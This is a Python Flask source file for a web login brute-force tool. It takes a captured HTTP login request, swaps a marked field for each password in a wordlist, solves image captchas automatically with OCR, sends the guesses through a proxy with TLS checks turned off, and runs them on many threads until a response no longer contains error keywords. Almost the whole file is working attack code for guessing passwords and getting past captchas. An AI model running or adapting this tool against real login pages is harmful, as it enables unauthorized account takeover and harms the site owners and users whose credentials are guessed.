from flask import Flask,render_template,request,jsonify
import requests
import json
import base64
import os
import ddddocr
import queue
import fileinput
import threading
import urllib3
from rich.progress import Progress
from colorama import Fore

app = Flask(__name__)

# 初始化
proxies = {}
headers = {}
urls = ''
isUploadDict = False
captcha_link_mark = 'YBZXSHZQ383CGVFC39PN'
boom_params_mark = 'AMD580EEWRQQEQ6FXG9I'
captcha_params_mark = 'ME3SDCTPJEMEPAUASQ3K'
error_params = ['账号','密码','账户','账号','用户','参数']
error_captcha = ['验证码','captcha']
threadNum = 1
hp = 'http://'
isPassword = False
ocr = ddddocr.DdddOcr(show_ad=False)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
# 首页
@app.route('/')
def index():
    return render_template('index.html')

# 设置代理接口
@app.route('/set_proxy', methods=['GET'])
def set_proxy():
    if request.args['py'] != '':
        py = 'http://' + request.args['py']
    else:
        py = request.args['py']
    global proxies
    proxies = {
        'https': py,
        'http': py  
    }
    return 'ok'

# 代理测试接口
@app.route('/proxy_test')
def proxy_test():
    response=requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5, verify=False)
    return jsonify(json.loads(response.text))

# 测试代理
def testProxies():
    response=requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5, verify=False)
    return json.loads(response.text)['origin']

# 获取请求包，初始化请求头和请求路径，返回基本参数
@app.route('/send_packet', methods=['GET'])
def send_packet():
    packet = str(base64.b64decode(request.args['packet']), 'utf8')
    result = analyze_packet(packet)
    global urls
    urls = create_url(result['header']['Host'], result['url'])
    global headers
    if('Cookie' in result['header']):
        result['header'].pop('Cookie')
    if('Content-Length' in result['header']):
        result['header'].pop('Content-Length')
    headers = result['header']
    # json键值对是无序的，传到前端会根据key的首字母进行排序
    # 这里直接返回字符串，再在前端进行数据处理
    return json.dumps(result['param'])

# 分析请求包，返回请求路径，请求头，参数字典
def analyze_packet(packet):
    url = packet.split('\n')[0][5:].split(' HTTP')[0]
    param = {}
    for li in packet.split('\n')[-1].split('&'):
        p = li.split('=')
        param[p[0]] = p[1]
    header = {}
    for li in packet.split('\n')[1:-2]:
        h = li.split(': ')
        header[h[0]] = h[1]
    result = {'url':url, 'param':param, 'header':header}
    return result

# 上传字典
@app.route('/upload_dict', methods=['POST'])
def upload_dict():
    global isUploadDict
    file = request.files['dict']
    file.save(os.path.join('upload/dict', 'upload_dict.txt'))
    isUploadDict = True
    return '字典设置成功！'

# 验证码测试
@app.route('/captcha_test', methods=['GET'])
def captcha_test():
    captcha_link = str(base64.b64decode(request.args['captcha_link']),'utf8')
    return get_captcha(captcha_link)

# 获取验证码
def get_captcha(url,authSession=''):
    if authSession == '':
        authSession = requests.session()
    response =  authSession.get(url, headers=headers, proxies=proxies, timeout=5, verify=False)
    res = ocr.classification(response.content)
    return res

# 判断是否为HTTPS
@app.route('/is_https', methods=['GET'])
def is_https():
    global hp
    if request.args['is_https'] == 'true':
        hp = 'https://'
        return 'https'
    else:
        hp = 'http://'
        return 'http'

def create_url(host,url):
    url = hp + host + url
    return url

# 设置线程数
@app.route('/thread_num', methods=['GET'])
def thread_num():
    global threadNum
    threadNum = int(request.args['threadNum'])
    return request.args['threadNum']

# 接收确定后的参数、开始爆破
@app.route('/start_boom', methods=['POST'])
def start_boom():
    params = request.json
    q = queue.Queue()
    threads = []
    sem=threading.Semaphore(threadNum)
    # 遍历找到验证码连接
    for key in params:
        # 判断该参数是否为验证码连接
        if key == captcha_link_mark:
            captcha_link = str(base64.b64decode(params[key]),'utf8')
    if captcha_link == '':
        print('请填写验证码连接')
    # 删除多余参数验证码连接
    params.pop(key)
    if isUploadDict == False:
        path = 'upload/dict/default.txt'
    else:
        path = 'upload/dict/upload_dict.txt'
    with fileinput.input(files=(path),openhook=fileinput.hook_encoded("utf-8")) as f:
        for li in f:
            li.replace("\n", "")
            q.put(li)
        with Progress() as progress:
            task = progress.add_task('[yellow]爆破IP为:'+testProxies(), total=q.qsize())
            for i in range(q.qsize()):
                sem.acquire()
                authSession = requests.session()
                td = threading.Thread(target=login_boom,args=(authSession,params,q.get(),captcha_link,sem,progress,task))
                threads.append(td)
                td.start()
                # 通过全局变量把返回值带出来进行判断返回
                if isPassword != False:
                    print(Fore.GREEN + '成功参数：' + isPassword)
                    return '成功参数：' + isPassword
            for t in threads:
                t.join()
    return '未能成功爆出密码！'

# 登录爆破
def login_boom(authSession,params,boom_params,captcha_link,sem,progress,task):
    u = urls
    d = {}
    # 遍历设置参数
    for key in params:
        # 判断该参数是否为爆破参数
        if params[key] == boom_params_mark:
            d[key] = boom_params
        # 判断该参数是否为验证码
        elif params[key] == captcha_params_mark:
            d[key] = get_captcha(captcha_link,authSession)
        else:
            d[key] = params[key]
    response = authSession.post(u, data=d, headers=headers, proxies=proxies, timeout=5, verify=False)
    if is_json(response.text):
        response = json.loads(response.text)
        result =  auto_json_result(response,authSession,params,boom_params,captcha_link,sem,progress,task)
    else:
        result =  auto_html_result(response.text,authSession,params,boom_params,captcha_link,sem,progress,task)
    if not progress.finished:
        progress.update(task, advance=1)
    sem.release()
    if result != False:
        global isPassword
        isPassword = result

# 判断str是否为json类型
def is_json(text):
    try:
        json.loads(text)
    except ValueError:
        return False
    return True

# 自动分析html类型返回结果
def auto_html_result(html_str,authSession,params,boom_params,captcha_link,sem,progress,task):
    isRight = True
    if any(x in html_str for x in error_captcha):
        isRight = False
        print(Fore.YELLOW + str(len(html_str)) + '     ' + '验证码错误: ' + boom_params)
        login_boom(authSession,params,boom_params,captcha_link,sem,progress,task)
    # 是否为爆破参数错误
    if any(x in html_str for x in error_params):
        isRight = False
        print(Fore.RED + str(len(html_str)) + '     ' + '爆破参数错误: ' + boom_params)
    if isRight == True:
        return boom_params
    else:
        return isRight

# 自动分析json类型返回结果
def auto_json_result(response,authSession,params,boom_params,captcha_link,sem,progress,task):
    isRight = True
    for key in response:
        # 是否为验证码错误
        if any(x in response[key] for x in error_captcha):
            isRight = False
            print(Fore.YELLOW + response[key] + ': ' + boom_params)
            login_boom(authSession,params,boom_params,captcha_link,sem,progress,task)
        # 是否为爆破参数错误
        if any(x in response[key] for x in error_params):
            isRight = False
            print(Fore.RED + response[key] + ': ' + boom_params)
    if isRight == True:
        return boom_params
    else:
        return isRight

if __name__ == '__main__':
    app.run(debug=True)